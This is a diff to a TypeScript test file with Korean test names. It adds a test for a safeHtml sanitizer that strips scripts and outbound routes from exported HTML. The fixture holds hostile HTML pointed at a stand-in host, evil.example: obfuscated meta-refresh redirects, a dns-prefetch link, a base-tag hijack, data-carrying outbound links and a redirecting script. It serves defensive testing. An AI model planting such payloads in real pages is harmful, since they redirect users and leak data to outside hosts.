@@ -1,5 +1,5 @@
 import { openDatabase } from '@core/db';
-import { MakeService, MAKE_CSP, sealHtml, type MakeRunner } from '@core/makes';
+import { MakeService, MAKE_CSP, MAKE_CSP_STATIC, safeHtml, sealHtml, type MakeRunner } from '@core/makes';
 
 const DOC = '<!doctype html><html><head><title>쇼핑몰 &amp; 주간 보고</title></head><body><h1>보고</h1></body></html>';
 
@@ -120,4 +120,22 @@ test('플러그인의 만들기 양식: 읽고, 승인의 대상(지문)에 넣�
   expect(a.plugin.makers).toEqual([{ name: '주간 보고', prompt: '세 줄 요약', format: 'slides' }, { name: '틀 없음', prompt: 'x', format: 'report' }]);
   write([{ name: '주간 보고', prompt: '바뀐 주문', format: 'slides' }]);
   expect(readPlugin(dir).hash).not.toBe(a.hash);
+});
+
+test('safeHtml: 내보내는 판은 스크립트를 끄고, 스크립트 없이 나가는 길도 무디게 한다', () => {
+  const doc = sealHtml(`<html><head><title>가</title><meta data-x=">" http-equiv="re&#102;resh" content="0;url=https://evil.example/?d=1"><META HTTP-EQUIV=refresh content="0;url=https://evil.example"><link rel="dns-prefetch" href="//evil.example"><base href="https://evil.example/"></head>
+    <body><a href="https://evil.example/?d=secret">바깥</a><a HREF = 'https://evil.example'>바깥2</a><a href="#s2">안쪽</a><svg><use xlink:href="#icon"/></svg><script>location = 'https://evil.example'</script><p id="s2" onclick="x()">글</p></body></html>`)!.html;
+  const safe = safeHtml(doc);
+  expect(safe.startsWith(`<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${MAKE_CSP_STATIC}">`)).toBe(true);
+  expect(MAKE_CSP_STATIC).toContain("script-src 'none'");
+  expect(MAKE_CSP_STATIC).not.toContain("script-src 'unsafe-inline'");
+  // 규칙은 하나만 남는다 (원래 것과 문서가 넣은 것은 무뎌진다)
+  expect(safe.match(/(?<!data-)http-equiv/gi)).toHaveLength(1);
+  expect(safe).not.toMatch(/<link[\s/>]/i);
+  expect(safe).not.toMatch(/<base[\s/>]/i);
+  expect(safe).not.toMatch(/(?<!data-)href\s*=\s*["']?\s*h/i);
+  // 문서 안에서 오가는 것은 그대로
+  expect(safe).toContain('<a href="#s2">');
+  expect(safe).toContain('xlink:href="#icon"');
+  expect(safe).toContain('<p id="s2"');
 });
